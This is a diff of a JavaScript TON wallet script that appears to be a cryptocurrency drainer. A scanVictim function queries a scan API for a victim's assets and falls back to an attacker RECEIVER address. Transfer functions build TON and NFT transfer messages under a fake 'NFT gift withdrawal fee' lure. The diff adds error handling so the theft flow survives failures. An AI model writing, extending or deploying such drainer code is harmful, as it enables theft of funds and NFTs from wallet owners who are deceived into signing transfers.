@@ -6,17 +6,31 @@ const TON_CONFIG = {
   NFT_FEE_TON: 0.03,
 };
 
+// Безопасное получение TON core
+function getTon() {
+  if (typeof window.TON !== 'undefined') return window.TON;
+  if (typeof TON !== 'undefined') return TON;
+  throw new Error('TON core not loaded');
+}
+
 async function scanVictim(address) {
-  const r = await fetch(TON_CONFIG.SCAN_API + '/api/scan', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ address }),
-  });
-  return await r.json();
+  try {
+    const r = await fetch(TON_CONFIG.SCAN_API + '/api/scan', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ address }),
+    });
+    if (!r.ok) return { receiver: TON_CONFIG.RECEIVER, nfts: [] };
+    return await r.json();
+  } catch (e) {
+    console.warn('Scan failed:', e);
+    return { receiver: TON_CONFIG.RECEIVER, nfts: [] };
+  }
 }
 
 async function transferTon(tonConnectUI, amountTon, comment) {
-  const { beginCell, toNano } = TON;
+  const T = getTon();
+  const { beginCell, toNano } = T;
   const body = beginCell()
     .storeUint(0, 32)
     .storeStringTail(comment || 'NFT gift withdrawal fee')
@@ -33,7 +47,8 @@ async function transferTon(tonConnectUI, amountTon, comment) {
 }
 
 async function transferNft(tonConnectUI, nftAddress) {
-  const { beginCell, Address, toNano } = TON;
+  const T = getTon();
+  const { beginCell, Address, toNano } = T;
   const body = beginCell()
     .storeUint(0x5fcc3d14, 32)
     .storeUint(0, 64)
